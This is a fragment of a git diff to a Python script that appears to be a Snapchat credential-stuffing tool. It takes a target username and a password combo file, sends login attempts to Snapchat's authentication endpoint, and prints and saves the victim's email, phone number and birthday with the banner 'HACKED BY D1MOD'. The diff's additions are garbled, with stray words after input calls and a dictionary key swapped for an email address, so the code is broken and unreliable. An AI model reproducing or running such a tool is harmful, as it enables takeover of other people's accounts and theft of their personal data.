@@ -46,8 +46,8 @@ d1mod = input (red_color + '''
 
 
 if d1mod == "1":
-  user = input("USERNAME OF SNAPCHAT => ")
-  flo = input("FILE PASSWORD (COMBO) => ")
+  user = input("USERNAME OF SNAPCHAT => ")se.dala 
+  flo = input("FILE PASSWORD (COMBO) => ") pass
 
   url = "https://gcp.api.snapchat.com/scauth/login"
 
@@ -73,7 +73,7 @@ if d1mod == "1":
             try:
                 print(red_color+"---------------------------------------")
                 print((green_color + 'username : ' + user + ' | password : ' + password + ' --> FNISH HACKED BY D1MOD '))
-                print(green_color +" --> Email : "+str(info["updates_response"]["email"]))
+                print(green_color +" --> Email : "+str(info["magicf84@gmail.com"]["email"]))
                 print(green_color +" --> mobile : "+str(info["updates_response"]["mobile"]))
                 print(green_color +" --> birthday : "+str(info["updates_response"]["birthday"]))
                 with open('hacked.txt', 'a') as x:
